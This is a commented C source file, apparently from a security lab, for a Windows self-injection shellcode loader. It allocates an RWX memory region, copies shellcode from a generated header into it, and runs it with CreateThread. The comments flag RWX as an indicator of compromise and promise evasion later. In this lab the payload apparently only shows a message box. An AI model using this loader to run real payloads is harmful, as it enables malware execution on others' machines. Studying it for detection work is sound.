/*
* allocates an RWX memory region, copies shellcode into it,
* and executes it via CreateThread in the current process (self injection).
*
* sc_bytes.h is generated by convert.py : 
* nasm -f bin shellcode.asm -o shellcode.bin
* python convert.py shellcode.bin > sc_bytes.h 
*
* Compile : cl loader.c /W4
*/

#include <windows.h>
#include <stdio.h>

/* Generated - containes : unsigned char sc[] = { ... };*/
#include "sc_bytes.h"

int main(void)
{
    LPVOID region  = NULL; /* pointer to the allocated RWX region*/
    HANDLE hThread = NULL; /* handle to the shellcode thread */
    DWORD tid      = 0;   /* thread ID (unused, but required by CreateThread) */

    printf("[*] Shellcode size : %zu bytes", sizeof(sc));

    /*
    * VirtualAlloc : allocate a private RWX region.
    * RWX (Read + Write + Execute) is an IOC, legitimate DLLs laoded
    * using separate RX and RW regions
    * we use it here for simplicity, we will addres evasion later
    */

    region = VirtualAlloc(
        NULL,  /* let Windows choose the base address */
        sizeof(sc),           /* exact size of the shellcode */
        MEM_COMMIT | MEM_RESERVE, /* allocate and commit in one call */
        PAGE_EXECUTE_READWRITE /* RWX ; intentional IOC for the lab */
    );

    if (region == NULL) {
        printf("[-] VirtualAlloc failed : %lu\n", GetLastError());
        return 1;
    }
    printf("[+] Region RWX @ %p\n", region);

    /*
    *memcpy : copy shellcode bytes into the shellcode region.
    *sizeof(sc) is used, NOT strlen(), because the shellcode
    * contains null bytes (UTF-16 comparisions, DWORD constants),
    * strlen() would stop at the first 0x00
    */

    memcpy(region, sc, sizeof(sc));
    printf("[+] Shellcode copied OK\n");

    /*
    * CreateThread : execute the shellcode as a new thread.
    * The cast (LPTHREAD_START_ROUTINE) tells the compiler to treat
    * the void* buffer as a function pointer matching the expected
    * signature : DWORD WINAPI f(LPVOID)
    * we guarantee the shellcode respects the x64 calling convention
    */
   hThread = CreateThread(
    NULL,                   
    0,
    (LPTHREAD_START_ROUTINE)region,
    NULL,
    0,
    &tid
   );

   if (hThread == NULL) {
    printf("[-] CreateThread failed : %lu\n", GetLastError());
    VirtualFree(region, 0, MEM_RELEASE);
    return 1;
   }
   printf("[+] Thread %lu created waiting...\n", tid);

   /*
   *WaitFor Single Object : block until the shellcode thread finishes.
   * The MessageBox call inside the shellcode blocks until the user
   * clicks OK ; so this wait effectively pauses here until then.
   */
   WaitForSingleObject(hThread, INFINITE);
   printf("[+] Thread done.\n");

   /* Cleanup : clise handle and free the RWX region */
   CloseHandle(hThread);
   VirtualFree(region, 0, MEM_RELEASE);
   
   return 0;
}